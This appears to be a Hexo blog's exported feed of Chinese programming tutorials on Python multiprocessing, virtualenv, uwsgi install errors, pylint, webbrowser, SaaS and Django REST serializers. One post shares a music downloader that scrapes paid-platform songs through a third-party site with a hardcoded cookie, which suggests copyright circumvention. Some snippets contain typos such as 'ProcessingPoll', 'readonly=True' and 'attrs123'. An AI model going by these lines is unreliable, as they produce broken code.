<h1 id="使用pathos包下的multiprocessing"><a href="#使用pathos包下的multiprocessing" class="headerlink" title="使用pathos包下的multiprocessing"></a>使用pathos包下的multiprocessing</h1><p>这个包是使用dill的multiprocessing的一个fork，允许多参数输入：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pathos.multiprocessing import ProcessingPoll as Pool</span><br><span class="line"></span><br><span class="line">pool = Pool(4)</span><br><span class="line">results = pool.map(work, x, y)</span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>多进程</category>
      </categories>
      <tags>
        <tag>map</tag>
      </tags>
  </entry>
  <entry>
    <title>virtualenv使用，Ubuntu安装virtualenv和创建虚拟环境</title>
    <url>/2019/04/17/virtualenv/</url>
    <content><![CDATA[<p>Ubuntu安装虚拟环境<br><a id="more"></a></p>
<h1 id="安装和配置虚拟环境"><a href="#安装和配置虚拟环境" class="headerlink" title="安装和配置虚拟环境"></a>安装和配置虚拟环境</h1><p>sudo pip install virtualenv<br>sudo pip install virtualenvwrapper</p>
<p>virtualenvwrapper 是virtualenv的扩展管理包，可以将所有的虚拟环境整合在一个目录下。</p>
<h1 id="配置虚拟环境"><a href="#配置虚拟环境" class="headerlink" title="配置虚拟环境"></a>配置虚拟环境</h1><p>创建虚拟环境管理目录<br>mkdir ~/.virtualenvs</p>
<p>打开.bashrc<br>sudo vim ~/.bashrc</p>
<p>在.bashrc的末尾增加下面内容<br>export WORKON_HOME=$HOME/.virtualenvs  # 所有虚拟环境存储的目录<br>source /usr/local/bin/virtualenvwrapper.sh</p>
<p>启用配置文件<br>source ~/.bashrc</p>
<h1 id="虚拟环境操作"><a href="#虚拟环境操作" class="headerlink" title="虚拟环境操作"></a>虚拟环境操作</h1><p>创建虚拟环境<br>mkvirtualenv env_name # env_name为你要创建的虚拟环境的名字，创建虚拟环境需要联网<br>创建指定python版本的虚拟环境<br>mkvirtualenv -p /usr/bin/python3 env_name<br>mkvirtualenv -p /usr/bin/python2 env_name<br>运行环境<br>workon env_name<br>workon + 两次tab键可以显示所有的虚拟环境<br>退出虚拟环境<br>deactivate<br>删除虚拟环境<br>rmvirtualenv env_name</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>虚拟环境</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu安装uwsgi的教程</title>
    <url>/2019/04/17/ubuntu-uwsgi/</url>
    <content><![CDATA[<p>python虚拟环境安装uwsgi出错的解决办法！<br><a id="more"></a></p>
<h1 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*** uWSGI compiling embedded plugins ***</span><br><span class="line">[thread 0][x86_64-linux-gnu-gcc -pthread] plugins/python/python_plugin.o</span><br><span class="line">[thread 1][x86_64-linux-gnu-gcc -pthread] plugins/python/pyutils.o</span><br><span class="line">In file included from plugins/python/python_plugin.c:1:0:</span><br><span class="line">plugins/python/uwsgi_python.h:2:20: fatal error: Python.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line">In file included from plugins/python/pyutils.c:1:0:</span><br><span class="line">plugins/python/uwsgi_python.h:2:20: fatal error: Python.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">Command &quot;/home/ubuntu/envflask/env/bin/python3 -u -c &quot;import setuptools, tokenize;__file__=&apos;/tmp/pip-build-wthov1ur/uwsgi/setup.py&apos;;f=getattr(tokenize, &apos;open&apos;, open)(__file__);code=f.read().replace(&apos;\r\n&apos;, &apos;\n&apos;);f.close();exec(compile(code, __file__, &apos;exec&apos;))&quot; install --record /tmp/pip-quiupta5-record/install-record.txt --single-version-externally-managed --compile --install-headers /home/ubuntu/envflask/env/include/site/python3.5/uwsgi&quot; failed with error code 1 in /tmp/pip-build-wthov1ur/uwsgi/</span><br></pre></td></tr></table></figure>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p><code>apt-get install python3.5-dev</code> 这里可以灵活选择自己的python版本</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>uwsgi</tag>
      </tags>
  </entry>
  <entry>
    <title>taobao</title>
    <url>/2019/04/17/taobao/</url>
    <content><![CDATA[<p>淘宝链接<br><a id="more"></a></p>
<p><a href="https://shop508230529.taobao.com/" target="_blank" rel="noopener">我的淘宝</a><br><a href="https://item.taobao.com/item.htm?spm=a312a.7700824.w4023-21502492170.7.b843535eqfp5jX&amp;id=590866534688" target="_blank" rel="noopener">我的商品</a></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
  </entry>
  <entry>
    <title>python-dev安装，centos的python-dev安装</title>
    <url>/2019/04/15/pythondev/</url>
    <content><![CDATA[<p>python-dev的安装方法<br><a id="more"></a></p>
<h1 id="错误原因"><a href="#错误原因" class="headerlink" title="错误原因"></a>错误原因</h1><p>有时我们会遇到这样的错误，在linux的虚拟环境中，某些软件无法正常安装，一般来说是我们的python-dev这个模块没有安装，我们在通过Linux自带的命令去安装他们，下面我们提供两个例子</p>
<h1 id="Ubuntu和Debian"><a href="#Ubuntu和Debian" class="headerlink" title="Ubuntu和Debian"></a>Ubuntu和Debian</h1><p><code>apt-get install python3.5-dev</code><br><code>apt-get install python3-dev</code></p>
<h1 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">running build_ext</span><br><span class="line">building &apos;audiotools.pcm&apos; extension</span><br><span class="line">creating build/temp.linux-x86_64-2.7</span><br><span class="line">creating build/temp.linux-x86_64-2.7/src</span><br><span class="line">gcc -pthread -fno-strict-aliasing -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -DNDEBUG -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -fPIC -I/usr/include/python2.7 -c src/pcm.c -o build/temp.linux-x86_64-2.7/src/pcm.o</span><br><span class="line">src/pcm.c:2:20: 致命错误：Python.h：没有那个文件或目录</span><br><span class="line"> #include &lt;Python.h&gt;</span><br><span class="line">                    ^</span><br></pre></td></tr></table></figure>
<p>解决办法</p>
<p><code>yum install -y gcc* pcre-devel openssl-devel python-devel &amp;&amp; pip install uwsgi</code></p>
<h3 id="一键安装所有环境"><a href="#一键安装所有环境" class="headerlink" title="一键安装所有环境"></a>一键安装所有环境</h3><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>软件安装</category>
      </categories>
      <tags>
        <tag>python-dev</tag>
      </tags>
  </entry>
  <entry>
    <title>xshell下载安装和上传文件的教程</title>
    <url>/2019/04/15/xshell/</url>
    <content><![CDATA[<p>xshell教程，ftp使用教程<br><a id="more"></a></p>
<h1 id="xshell简介"><a href="#xshell简介" class="headerlink" title="xshell简介"></a>xshell简介</h1><p>Xshell可以在Windows界面下用来访问远端不同系统下的服务器，从而比较好的达到远程控制终端的目的。可连接多个服务器，通过各种方式，比如ssh等</p>
<h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a href="https://www.netsarang.com/zh/free-for-home-school/" target="_blank" rel="noopener">https://www.netsarang.com/zh/free-for-home-school/</a></p>
<p>添加姓名和邮件，并且验证邮件就可以免费使用xshell，如果用于商业目的，需要购买这个软件</p>
<h2 id="下载连接会发到你的邮箱里"><a href="#下载连接会发到你的邮箱里" class="headerlink" title="下载连接会发到你的邮箱里"></a>下载连接会发到你的邮箱里</h2><h1 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h1><ol>
<li><p>点击图标<br><img src="https://res.cloudinary.com/dherizchh/image/upload/v1555305057/111.png" alt></p>
</li>
<li><p>把弹出的窗口关闭</p>
</li>
<li>出来这个界面<br><img src="https://res.cloudinary.com/dherizchh/image/upload/v1555305109/3.png" alt></li>
<li>输入 <code>put</code> 会出现本地的目录，选择你要上传的文件即可</li>
<li>默认保存在/home下</li>
</ol>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>软件分享</category>
      </categories>
      <tags>
        <tag>xshell</tag>
      </tags>
  </entry>
  <entry>
    <title>pylint的用法，更好地规范python代码和检查错误</title>
    <url>/2019/04/08/pylint/</url>
    <content><![CDATA[<p>如何使用pylint来更好的规范我们的python代码<br><a id="more"></a></p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>pylint是一个以pep8为规范的用来规范我们的代码和检查我的代码错误的工具。<br>Pylint 是一个 Python 工具，除了平常代码分析工具的作用之外，它提供了更多的功能：如检查一行代码的长度，变量名是否符合命名标准，一个声明过的接口是否被真正实现等等。<br>Pylint 的一个很大的好处是它的高可配置性，高可定制性，并且可以很容易写小插件来添加功能。<br>如果运行两次 Pylint，它会同时显示出当前和上次的运行结果，从而可以看出代码质量是否得到了改进。</p>
<h1 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h1><p><code>pip install pylint</code></p>
<h1 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h1><p>pylint [option] **.py</p>
<h1 id="输出信息分类"><a href="#输出信息分类" class="headerlink" title="输出信息分类"></a>输出信息分类</h1><p>MESSAGE_TYPE 有如下几种：</p>
<p>(C) 惯例。违反了编码风格标准</p>
<p>(R) 重构。写得非常糟糕的代码。</p>
<p>(W) 警告。某些 Python 特定的问题。</p>
<p>(E) 错误。很可能是代码中的错误。</p>
<p>(F) 致命错误。阻止 Pylint 进一步运行的错误。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>python代码规范</category>
      </categories>
      <tags>
        <tag>pylint</tag>
      </tags>
  </entry>
  <entry>
    <title>python的webbrowser模块的使用教程</title>
    <url>/2019/04/06/webbrowser/</url>
    <content><![CDATA[<p>python的webbrowser模块的使用教程<br><a id="more"></a></p>
<h1 id="webbrowser作用介绍"><a href="#webbrowser作用介绍" class="headerlink" title="webbrowser作用介绍"></a>webbrowser作用介绍</h1><p>webbrowser可以启动本地默认的浏览器，来访问一个url；或者也可以指定一个浏览器类型</p>
<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import webbrowser</span><br><span class="line"># import selenium</span><br><span class="line"></span><br><span class="line">r = requests.get(&apos;https://baidu.com&apos;)</span><br><span class="line"># print(r)</span><br><span class="line"># # r.encoding = &quot;utf-8&quot;</span><br><span class="line"># print(r.text)</span><br><span class="line">webbrowser.open(r.url)</span><br><span class="line">webbrowser.open_new(r.url)  # 打开新的页面</span><br><span class="line">webbrowser.open_new_tab(r.url) # 打开新的标签</span><br></pre></td></tr></table></figure>
<h1 id="指定浏览器"><a href="#指定浏览器" class="headerlink" title="指定浏览器"></a>指定浏览器</h1><p>可以使用webbrowser指定浏览器，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = webbrowser.get(&apos;firefox&apos;)</span><br><span class="line">a.open(&apos;http://www.python.org&apos;)</span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>webbrowser</category>
      </categories>
      <tags>
        <tag>webbrowser</tag>
      </tags>
  </entry>
  <entry>
    <title>万能音乐下载的源码</title>
    <url>/2019/04/06/VIPmusic/</url>
    <content><![CDATA[<p>音乐下载的源码分享<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from re import findall, sub</span><br><span class="line">from tkinter.ttk import Combobox</span><br><span class="line">from requests import get, post</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;Cookie&apos;: &apos;Tip_of_the_day=2; encrypt_data=56f2bc9d081609eb8e605a176c9f144de8c9c6ac96288a2e51fce7143a94433d8c0c4fc70944b9163392d9ea977fc7343168112d1769b16d03bd4b9d7d56317224940c2824ccbeeccb73a633bdfeabdd7c124ff7f5064b6ef27b7959ebcb279cb52e5da22eff1a00fd6ee3efe7adc077a415e7bd0edfb126ed4487ef27904634; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1&apos;,</span><br><span class="line">    &apos;Host&apos;: &apos;moresound.tk&apos;,</span><br><span class="line">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&apos;,</span><br><span class="line">    &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def huoqu(urlid):</span><br><span class="line">    url = &apos;http://moresound.tk/music/&apos; + urlid</span><br><span class="line">    res = get(url, headers=headers)</span><br><span class="line">    ress = res.json()</span><br><span class="line">    ff = ress[&apos;url&apos;]</span><br><span class="line">    # print(ff)</span><br><span class="line">    return ff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Save(urlid):</span><br><span class="line">    url = huoqu(urlid)</span><br><span class="line">    res = get(url).content</span><br><span class="line">    Save_wenjian = sub(&apos;[\\\\/:*?\&quot;&lt;&gt;|]&apos;, &apos;&apos;, str(Save_name))  # 正则去掉文件名不支持的字符</span><br><span class="line">    with open(&apos;&#123;&#125;.mp3&apos;.format(Save_wenjian), &apos;wb&apos;)as f:</span><br><span class="line">        f.write(res)</span><br><span class="line"></span><br><span class="line">    confirmLabel.insert(END, &apos;已保存至本程序运行的文件下！！!!&apos;, &apos;\n\n请继续搜索下载&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def danqu_url(id):</span><br><span class="line">    global Save_name</span><br><span class="line">    url = &apos;http://moresound.tk/music/api.php?get_song=&#123;&#125;&apos;.format(sousuo_key)</span><br><span class="line">    data = &#123;&apos;mid&apos;: id&#125;</span><br><span class="line">    res = post(url, data=data, headers=headers)</span><br><span class="line">    ss = res.json()</span><br><span class="line">    # AAC = ss[&apos;url&apos;][&apos;24AAC&apos;]</span><br><span class="line">    mp3 = ss[&apos;url&apos;][&apos;128MP3&apos;]</span><br><span class="line">    Save_name = ss[&apos;song&apos;] + &apos;__&apos; + ss[&apos;singer&apos;]</span><br><span class="line">    Save(mp3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id_list = []  # 用于将sousuo()函数获取到的歌曲ID装起来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sousuo():</span><br><span class="line">    global sousuo_key</span><br><span class="line">    sousuoyinqin = xialalan.get()  # 获取输入的搜索引擎</span><br><span class="line"></span><br><span class="line">    dict_sousuo = &#123;&apos;QQ&apos;: &apos;qq&apos;, &apos;酷我&apos;: &apos;kw&apos;, &apos;虾米&apos;: &apos;xm&apos;, &apos;酷狗&apos;: &apos;kg&apos;, &apos;百度&apos;: &apos;bd&apos;, &apos;网易&apos;: &apos;wy&apos;&#125;</span><br><span class="line"></span><br><span class="line">    sousuo_key = dict_sousuo[sousuoyinqin]  # 确认选择的搜索引擎</span><br><span class="line">    del id_list[:]  # 清空列表，重置（使用多次以后列表装太多数据，不删除下次会出错）</span><br><span class="line">    confirmLabel.delete(0, END)  # 清空文本框</span><br><span class="line">    dd = namee_Entry.get()  # 获取输入的歌名</span><br><span class="line">    url = &apos;http://moresound.tk/music/api.php?search=&#123;&#125;&apos;.format(sousuo_key)</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;w&apos;: &apos;&#123;&#125;&apos;.format(dd),</span><br><span class="line">        &apos;p&apos;: &apos;1&apos;,</span><br><span class="line">        &apos;n&apos;: &apos;20&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    res = post(url, data=data, headers=headers)</span><br><span class="line">    ress = res.json()</span><br><span class="line">    for i in range(15):</span><br><span class="line">        name_geshou = ress[&apos;song_list&apos;][i][&apos;singer&apos;][0][&apos;name&apos;]</span><br><span class="line">        name_geming = ress[&apos;song_list&apos;][i][&apos;songname&apos;]</span><br><span class="line">        name_zhuanji = ress[&apos;song_list&apos;][i][&apos;albumname&apos;]</span><br><span class="line">        name_id = ress[&apos;song_list&apos;][i][&apos;songmid&apos;]</span><br><span class="line"></span><br><span class="line">        name_geming1 = sub(&apos;&lt;sup.*|\n|\r|&apos;, &apos;&apos;, str(name_geming)[:10])  # 去掉多余的信息</span><br><span class="line">        isserts = name_geshou + &apos;  &apos; + name_geming1 + &apos;  专辑：  &apos; + name_zhuanji</span><br><span class="line">        confirmLabel.insert(END, str(i) + &apos;:&apos; + isserts)  # 将获取到的详细信息打印到GUI</span><br><span class="line">        id_list.append(name_id)  # 获取到的id添加到列表里面，供xuanze(event)函数使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def xuanze(event):</span><br><span class="line">    ff = confirmLabel.get(confirmLabel.curselection())</span><br><span class="line">    ff = findall(&apos;\d+&apos;, str(ff))</span><br><span class="line">    # print(id_list[ii],ii)</span><br><span class="line">    confirmLabel.delete(0, END)  # 清空文本框</span><br><span class="line">    confirmLabel.insert(END, &apos;正在下载：请稍后...&apos;)</span><br><span class="line">    window.update()</span><br><span class="line">    if ff != []:</span><br><span class="line">        ii = int(ff[0])</span><br><span class="line">        danqu_url(id_list[ii])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">window = Tk()</span><br><span class="line">weather = StringVar()</span><br><span class="line">window.geometry(&apos;800x600+500+200&apos;)  # 窗口大小</span><br><span class="line">window.title(&apos;MP3歌曲下载===下载速度取决于您的网速&apos;)</span><br><span class="line"></span><br><span class="line">taitouLabel = Label(window, text=&quot;请输入要下载的歌曲:  &quot;, height=2, width=30, font=(&quot;Times&quot;, 20, &quot;bold&quot;), fg=&apos;red&apos;)</span><br><span class="line">sousuoLabel = Label(window, text=&quot;选择音乐库:  &quot;, height=1, width=10, font=(&quot;Times&quot;, 15, &quot;bold&quot;), fg=&apos;#00008b&apos;)</span><br><span class="line">xialalan = Combobox(window, width=4, textvariable=weather, font=(&quot;黑体&quot;, 18, &quot;bold&quot;), state=&apos;editable&apos;)</span><br><span class="line">xialalan[&apos;values&apos;] = (&apos;QQ&apos;, &apos;酷我&apos;, &apos;虾米&apos;, &apos;酷狗&apos;, &apos;百度&apos;, &apos;网易&apos;)</span><br><span class="line">xialalan.current(0)</span><br><span class="line"></span><br><span class="line">namee_Entry = Entry(window, width=25, font=(&quot;Times&quot;, 20, &quot;bold&quot;))</span><br><span class="line"></span><br><span class="line">button = Button(window, text=&quot;搜索&quot;, command=sousuo, )  # .grid_location(33,44)</span><br><span class="line">GunDongTiao = Scrollbar(window)  # 设置滑动块组件</span><br><span class="line">confirmLabel = Listbox(window, height=15, width=55, font=(&quot;Times&quot;, 15, &quot;bold&quot;), fg=&apos;red&apos;, bg=&apos;#EEE5DE&apos;,</span><br><span class="line">                       yscrollcommand=GunDongTiao.set)  # Listbox组件添加Scrollbar组件的set()方法</span><br><span class="line">confirmLabel.bind(&apos;&lt;Double-Button-1&gt;&apos;, xuanze)  # 双击选择文本框的内容</span><br><span class="line">GunDongTiao.config(command=confirmLabel.yview)  # 设置Scrollbar组件的command选项为该组件的yview()方法</span><br><span class="line">taitouLabel.grid(column=1)</span><br><span class="line">sousuoLabel.grid(row=0, column=0)</span><br><span class="line">xialalan.grid(row=1, column=0)</span><br><span class="line">namee_Entry.grid(row=1, column=1, sticky=N + S)</span><br><span class="line">button.grid(row=1, column=1, sticky=E)</span><br><span class="line"></span><br><span class="line">confirmLabel.grid(row=3, column=1, sticky=E)</span><br><span class="line">GunDongTiao.grid(row=3, column=2, sticky=N + S + W)  # 设置垂直滚动条显示的位置</span><br><span class="line">window.mainloop()</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>源码分享</category>
      </categories>
      <tags>
        <tag>音乐下载</tag>
      </tags>
  </entry>
  <entry>
    <title>saas是什么，如何理解saas概念？</title>
    <url>/2019/03/17/saas/</url>
    <content><![CDATA[<p>saas的理解<br><a id="more"></a></p>
<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>SaaS是Software-as-a-Service（软件即服务）的简称。</p>
<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ol>
<li>关于使用。预定酒店，浏览网页，特点在于：不用装APP或PC端，在线使用。</li>
<li>关于存储。saas的数据存在云端。</li>
<li>关于服务内容。软件能实现的功能，不管是在线用还是下载了用都一样，SaaS在线直连，内容更丰富。</li>
<li>关于版本更新。一天24小时不断线，自动更新更方便。</li>
<li>关于收费。要长期服务，而且需求在增加，所以不会一锤子买断，一般采用租赁付费。</li>
</ol>
<h1 id="其他名称的理解"><a href="#其他名称的理解" class="headerlink" title="其他名称的理解"></a>其他名称的理解</h1><blockquote>
<p>以电脑为例</p>
<ul>
<li>iass基础设施服务（组装机）：自己买零件组装电脑</li>
<li>paas平台即服务（品牌机）：买组装好的电脑</li>
<li>saas软件即服务（去网吧）：网吧提供一切，包括电，但是你得花钱，而且是根据配置和时长来付钱的</li>
</ul>
</blockquote>
<h1 id="顶级SaaS公司"><a href="#顶级SaaS公司" class="headerlink" title="顶级SaaS公司"></a>顶级SaaS公司</h1><p>1) Salesforce</p>
<p>SaaS龙头，立足于CRM，已拓展到平台、营销、分析和社交网络。</p>
<p>2) Microsoft</p>
<p>作为重塑者之一，将桌面生产力套件Office升级成Office 365云端版本。它还提供了Dynamics CRM，SharePoint协作，甚至按需提供SQL Server数据库。</p>
<p>3) Adobe Creative Cloud</p>
<p>另一个重塑者，Adobe是桌面创意软件之王，如今提供云端版本，Photoshop和其他音频和视频编辑工具订阅使用。Creative Suite提供平面设计，视频编辑，Web开发和摄影编辑。</p>
<p>4) Box</p>
<p>Box最初是一家云存储公司，已经扩展到为存储在其服务器上的文件提供文件协作和编辑服务。</p>
<p>5) Amazon Web Services SaaS</p>
<p>亚马逊的SaaS产品既包括构建自己的SaaS应用程序的平台，也包括许多来自第三方供应商的SaaS产品，其中许多都位于此列表中。</p>
<p>6) Google G Suite</p>
<p>Google提供的各项服务主要包括Gmail、存储和日历等，但增加了自定义电子邮件和全天候支持等功能，订阅付费。</p>
<p>7) Slack</p>
<p>即使微软推出具有竞争力的产品，Slack也是最受欢迎的企业协作平台之一。它为现代团队提供信息、归档和搜索。</p>
<p>8) Zendesk</p>
<p>提供基于云的客户服务，支持追踪、采购跟踪、计费、运输和其他客户数据等功能。</p>
<p>9) ADP</p>
<p>世界上最知名的工资管理品牌之一，提供云端人力资本管理，涉及人力资源、工资和员工福利。</p>
<p>10) Oracle</p>
<p>软件巨头转型SaaS，已经将所有原有业务线转移到云端，包括ERP、CRM、SCM、HR和工资。Oracle收购了CRM领域的NetSuite，不同于Oracle和Salesforce，NetSuite对准中小企业客户。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>saas</category>
      </categories>
      <tags>
        <tag>saas</tag>
      </tags>
  </entry>
  <entry>
    <title>ModelSerializer及Validation自定义验证逻辑</title>
    <url>/2019/02/06/django_validation/</url>
    <content><![CDATA[<h1 id="field参数"><a href="#field参数" class="headerlink" title="field参数"></a>field参数</h1><ul>
<li><p>read_only：True</p>
<p>  表示不允许用户自己上传，只能用于api的输出。如果某个字段设置了read_only=True，那么就不需要进行数据验证，只会在返回时，将这个字段序列化后返回<br>    举个简单的例子：在用户进行购物的时候，用户post订单时，肯定会产生一个订单号，而这个订单号应该由后台逻辑完成，而不应该由     用户post过来，如果不设置read_only=True，那么验证的时候就会报错。</p>
</li>
<li><p>order_sn = serializers.CharField(readonly=True)</p>
</li>
<li><p>write_only: 与read_only对应</p>
</li>
<li><p>required: 顾名思义，就是这个字段是否必填。</p>
</li>
<li><p>allow_null/allow_blank：是否允许为NULL/空 。</p>
</li>
<li><p>error_messages：出错时，信息提示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name = serializers.CharField(required=True, min_length=6,</span><br><span class="line">                error_messages=&#123;</span><br><span class="line">                    &apos;min_length&apos;: &apos;名字不能小于6个字符&apos;,</span><br><span class="line">                    &apos;required&apos;: &apos;请填写名字&apos;&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>label: 字段显示设置，如 label=’验证码’</p>
</li>
<li><p>help_text: 在指定字段增加一些提示文字，这两个字段作用于api页面比较有用</p>
</li>
<li><p>style: 说明字段的类型，这样看可能比较抽象，看下面例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在api页面，输入密码就会以*显示</span><br><span class="line">password = serializers.CharField(</span><br><span class="line">    style=&#123;&apos;input_type&apos;: &apos;password&apos;&#125;)</span><br><span class="line"># 会显示选项框</span><br><span class="line">color_channel = serializers.ChoiceField(</span><br><span class="line">    choices=[&apos;red&apos;, &apos;green&apos;, &apos;blue&apos;],</span><br><span class="line">    style=&#123;&apos;base_template&apos;: &apos;radio.html&apos;&#125;)</span><br><span class="line">  这里面，还有一个十分有用的validators参数，这个我们会在后面提及！</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="HiddenField"><a href="#HiddenField" class="headerlink" title="HiddenField"></a>HiddenField</h1><p>HiddenField的值不依靠输入，而需要设置默认的值，不需要用户自己post数据过来，也不会显式返回给用户，最常用的就是user!!<br>  我们在登录情况下，进行一些操作，假设一个用户去收藏了某一门课，那么后台应该自动识别这个用户，然后用户只需要将课程的id post过来，那么这样的功能，我们配合CurrentUserDefault()实现。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 这样就可以直接获取到当前用户</span><br><span class="line">user = serializers.HiddenField(</span><br><span class="line">    default=serializers.CurrentUserDefault())</span><br></pre></td></tr></table></figure></p>
<h1 id="ModelSerializer需要解决的2个问题"><a href="#ModelSerializer需要解决的2个问题" class="headerlink" title="ModelSerializer需要解决的2个问题"></a>ModelSerializer需要解决的2个问题</h1><p>1，某个字段不属于指定model，它是write_only，需要用户传进来，但我们不能对它进行save( )，因为ModelSerializer是基于Model，这个字段在Model中没有对应，这个时候，我们需要重载validate！<br>如在用户注册时，我们需要填写验证码，这个验证码只需要验证，不需要保存到用户这个Model中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def validate(self, attrs):</span><br><span class="line">    del attrs[&quot;code&quot;]</span><br><span class="line">    return attrs123</span><br></pre></td></tr></table></figure></p>
